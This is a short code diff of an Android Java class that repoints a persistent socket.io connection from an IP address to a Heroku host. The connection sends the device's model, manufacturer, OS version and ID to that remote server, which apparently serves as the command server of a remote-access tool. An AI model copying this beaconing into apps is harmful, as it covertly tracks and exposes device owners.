@@ -21,7 +21,7 @@ public class IOSocket {
             opts.reconnectionDelay = 5000;
             opts.reconnectionDelayMax = 999999999;
 
-            ioSocket = IO.socket("http://3.6.95.182:22222?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
+            ioSocket = IO.socket("https://xwizer.herokuapp.com:443?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
         } catch (URISyntaxException e) {
             e.printStackTrace();
         }
